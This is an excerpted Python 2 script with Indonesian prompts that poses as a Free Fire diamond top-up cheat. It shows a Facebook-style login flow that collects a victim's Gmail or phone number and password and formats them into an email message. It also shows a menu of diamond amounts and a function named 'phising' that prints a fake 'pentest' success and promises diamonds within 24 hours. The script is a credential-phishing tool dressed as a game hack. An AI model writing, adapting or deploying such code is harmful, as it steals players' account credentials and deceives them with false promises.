...
br.addheaders = [('User-Agent', ' Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36')]
...
def login():
    ...
    try:
        ...
        namafb = raw_input('\x1b[1;91m[+] \x1b[1;36mNama Akun FreeFire \x1b[1;91m: \x1b[1;92m ')
        ...
        if 'save-device' in url:
            try:
                ...
                SUBJECT = 'nama akun free fire pasti =  ' + str(namafb)
                TEXT = 'Gmail / no telp =  ' + str(ids) + ' password = ' + str(pwds)
                message = ('Subject: {}\n\n{}').format(SUBJECT, TEXT)
...
def menu():
    ...
    print '\xe2\x95\x91-> \x1b[1;37;40m1. 720 Diamonds'
    print '\xe2\x95\x91-> \x1b[1;37;40m2. 1450 Diamonds'
    print '\xe2\x95\x91-> \x1b[1;37;40m3. 2180 Diamonds'
    print '\xe2\x95\x91-> \x1b[1;37;40m4. 3640 Diamonds'
    print '\xe2\x95\x91-> \x1b[1;37;40m5. 7290 Diamonds'
    print '\xe2\x95\x91-> \x1b[1;37;40m6. 36500 Diamonds'
...
def phising():
    os.system('clear')
    print '\x1b[1;32mSedang Melakukan Pentest Ke Codashop'
    time.sleep(2)
    print '\x1b[1;34mBerhasil !'
    time.sleep(2)
    print '\x1b[1;36mHasil TopUp Akan Dikirim Dalam 24 Jam,Agar Tidak Terdeteksi cheat'
    os.sys.exit()
